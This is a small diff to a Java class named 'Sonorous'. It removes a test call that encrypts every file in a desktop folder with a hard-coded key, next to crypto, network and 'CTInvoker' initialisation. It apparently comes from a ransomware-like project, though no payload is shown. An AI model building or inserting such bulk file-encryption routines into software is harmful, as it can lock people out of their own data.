@@ -15,12 +15,9 @@ public class Sonorous {
 	public static void main(String[] args) throws Exception {
 		Crypto.init();
 		Network.init();
-		
 		cti = new CTInvoker();
 		
-		File folder = new File("C:/Users/Sam/Desktop/test");
-		String key = "HILARY2K16";
-		FileUtil.encryptFiles(folder, key);
+		
 	}
 
 }
